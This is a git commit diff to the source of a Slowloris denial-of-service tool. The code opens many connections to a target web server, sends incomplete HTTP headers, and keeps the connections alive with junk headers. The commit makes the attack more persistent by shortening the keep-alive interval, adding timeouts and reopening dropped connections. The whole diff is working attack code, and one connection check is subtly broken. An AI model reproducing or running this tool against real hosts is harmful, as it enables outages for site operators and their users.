1f65c5617c7654dcb04af8b43f3be7ba4834edc6
Splitty <splittydev@gmail.com>
2017-03-13 09:56:42 +0100

    Add more statistics and guard against more errors

--- src/slow_loris/client.py
+++ src/slow_loris/client.py
@@ -14,20 +14,20 @@ class SlowLoris:
     def __init__(self):
         self.connections = []
         self.recreated_connections = 0
+        self.connections_dropped = False
         self.keepalive_thread = threading.Thread(target=self.keep_alive)
         self.keepalive_thread.setDaemon(True)
         self.keepalive_thread.start()
 
     def attack(self, host, port, count):
         """Starts the attack."""
-        print("Initializing {} connections.".format(count))
+        print("Initializing up to {} connections.".format(count))
         # Start 'count' connections and send the initial HTTP headers.
-        for _ in range(count):
-            try:
-                conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
-                self.connections.insert(0, conn)
-            except TimeoutError:
-                pass
+        for i in range(count):
+            if i == count // 10 and not self.connections_dropped:
+                print("Be patient, this could take some time.")
+            conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
+            self.connections.insert(0, conn)
 
     def stop(self):
         """Stops the attack."""
@@ -37,9 +37,9 @@ class SlowLoris:
     def keep_alive(self):
         """Make sure that connections stay alive once established."""
         while True:
-            time.sleep(10)
+            time.sleep(5)
             connection_count = len(self.connections)
-            print("Sending keep-alive headers for {} connections.".format(connection_count))
+            # print("Sending keep-alive headers for {} connections.".format(connection_count))
             # Every 10 seconds, send HTTP nonsense to prevent the connection from timing out.
             for i in range(0, connection_count):
                 try:
@@ -50,14 +50,16 @@ class SlowLoris:
                 # If the server closed one of our connections,
                 # re-open the connection in its place.
                 except:
-                    threshold = connection_count // 20
-                    if self.recreated_connections > threshold:
-                        print("Recreated {} connections.".format(self.recreated_connections))
+                    if not self.connections_dropped:
+                        self.connections_dropped = True
+                        print("Host started dropping connections.")
+                    threshold = 5
+                    if self.recreated_connections >= threshold:
+                        print("Reconnected {} dropped connections."
+                              .format(self.recreated_connections))
                         self.recreated_connections -= threshold
                     host, port = (self.connections[i].host, self.connections[i].port)
-                    try:
-                        conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
+                    conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
+                    if conn.is_connected:
                         self.connections[i] = conn
                         self.recreated_connections += 1
-                    except TimeoutError:
-                        pass
--- src/slow_loris/connection.py
+++ src/slow_loris/connection.py
@@ -10,12 +10,19 @@ class LorisConnection:
         self.host = host
         self.port = port
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket.settimeout(5)
         try:
+            # TODO: Add SSL support
             self.socket.connect((self.host, self.port))
-        except TimeoutError:
-            print("TANGO DOWN! (Host={}, Port={}, Status='offline')".format(self.host, self.port))
-            raise
-        # TODO: Add SSL support
+            self.socket.settimeout(None)
+            self.connected = True
+        except(TimeoutError, socket.timeout):
+            self.connected = False
+            print("TANGO DOWN! (host unreachable)")
+
+    def is_connected(self):
+        """Tests if the connection has been established."""
+        return self.connected
 
     def close(self):
         """Closes the connection."""
@@ -24,9 +31,15 @@ class LorisConnection:
     def send_headers(self, uagent):
         """Sends headers."""
         template = "GET /?{} HTTP/1.1\r\n{}\r\nAccept-language: en-US,en,q=0.5\r\n"
-        self.socket.send(template.format(random.randrange(0, 2000), uagent).encode("ascii"))
+        try:
+            self.socket.send(template.format(random.randrange(0, 2000), uagent).encode("ascii"))
+        except socket.timeout:
+            pass
         return self
 
     def keep_alive(self):
-        """Sends keep-alive headers."""
-        self.socket.send("X-a: {}\r\n".format(random.randrange(1, 5000)).encode("ascii"))
+        """Sends garbage to keep the connection alive."""
+        try:
+            self.socket.send("X-a: {}\r\n".format(random.randint(0, 5000)).encode("ascii"))
+        except socket.timeout:
+            pass
